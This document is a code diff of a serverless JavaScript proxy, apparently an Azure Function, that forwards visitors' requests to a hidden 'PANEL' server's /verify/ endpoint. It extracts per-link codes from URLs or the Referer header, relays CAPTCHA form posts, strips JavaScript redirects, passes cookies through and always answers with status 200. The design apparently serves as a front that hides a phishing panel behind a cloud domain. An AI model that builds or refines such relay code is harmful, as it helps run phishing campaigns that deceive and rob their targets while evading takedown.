@@ -5,31 +5,45 @@ module.exports = async function (context, req) {
     let path = req.headers['x-ms-original-url'] || req.url || '/';
     try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
     
-    // 1. Clean up the path
     path = path.replace(/^\/api\/proxy/, '');
     if (!path.startsWith('/')) path = '/' + path;
 
-    // 2. Extract the code
     const parts = path.split('/').filter(Boolean);
     let code = '';
     
-    if (parts.length >= 1) {
-        // Grabs the last part of the URL (which is always the code)
-        code = parts[parts.length - 1]; 
+    // Try to grab the code from the URL (e.g. /random/CODE)
+    if (parts.length >= 2 && parts[1].length > 4) {
+        code = parts[1];
+    } else if (parts.length === 1 && parts[0].length > 4 && parts[0] !== 'verify') {
+        code = parts[0];
     }
 
-    if (!code || code.length < 4) {
-        context.res = { status: 400, body: "Invalid link. Missing code." };
+    // If it's a POST from the form (submitting to root), we need the code from the form body
+    if (req.method === 'POST' && !code && req.body) {
+        // If they submitted to the root, the body has the code (or we check the Referer URL)
+        const referer = req.headers['referer'] || '';
+        const refParts = referer.split('/').filter(Boolean);
+        if (refParts.length > 0) code = refParts[refParts.length - 1];
+    }
+
+    if (!code) {
+        // If we still don't have a code, we can't proceed
+        context.res = { status: 400, body: "Missing code." };
         return;
     }
 
-    // 3. Always target the panel's /verify/ endpoint
-    path = `/verify/${code}`;
+    // 1. Define the target URL
+    let targetPath = `/verify/${code}`;
+    
+    // 2. If it's a POST, we forward the POST to /verify/CODE to trigger the CAPTCHA pass
+    // If it's a GET, we fetch the page (either the CAPTCHA or the final template)
+    let currentUrl = `https://${PANEL}${targetPath}`;
+    
     if (req.query && Object.keys(req.query).length > 0) {
-        path += '?' + new URLSearchParams(req.query).toString();
+        currentUrl += '?' + new URLSearchParams(req.query).toString();
     }
 
-    context.log(`Forwarding ${req.method} to: ${path}`);
+    context.log(`Forwarding ${req.method} to: ${currentUrl}`);
 
     const forwardHeaders = {
         'Host': PANEL,
@@ -47,10 +61,9 @@ module.exports = async function (context, req) {
     }
 
     try {
-        let currentUrl = `https://${PANEL}${path}`;
         let r;
 
-        // 4. Follow server-side redirects (302, 301, etc.)
+        // 3. Follow server-side redirects
         for (let hop = 0; hop < 5; hop++) {
             r = await fetch(currentUrl, {
                 method: req.method,
@@ -72,17 +85,14 @@ module.exports = async function (context, req) {
         let responseBody = await r.text();
         const contentType  = r.headers.get('content-type') || 'text/html';
 
-        // 5. Clean up the HTML for the browser
+        // 4. Clean up the HTML
         if (contentType.includes('text/html')) {
-            // Strip JS redirects
             responseBody = responseBody.replace(/<script\b[^>]*>([\s\S]*?)<\/script>/gi, function(match, scriptContent) {
                 if (scriptContent.includes('window.location') || scriptContent.includes('location.href')) {
                     return ''; 
                 }
                 return match;
             });
-            // Fix any form actions the panel might have output
-            responseBody = responseBody.replace(/action=["']\/verify\/([^"']+)["']/gi, 'action="/api/proxy/$1"');
         }
 
         const respHeaders = {
@@ -94,7 +104,6 @@ module.exports = async function (context, req) {
         const setCookie = r.headers.get('set-cookie');
         if (setCookie) respHeaders['Set-Cookie'] = setCookie;
 
-        // Always return 200 to prevent browser redirects
         context.res = { status: 200, headers: respHeaders, body: responseBody };
     } catch (e) {
         context.log('Error:', e.message);
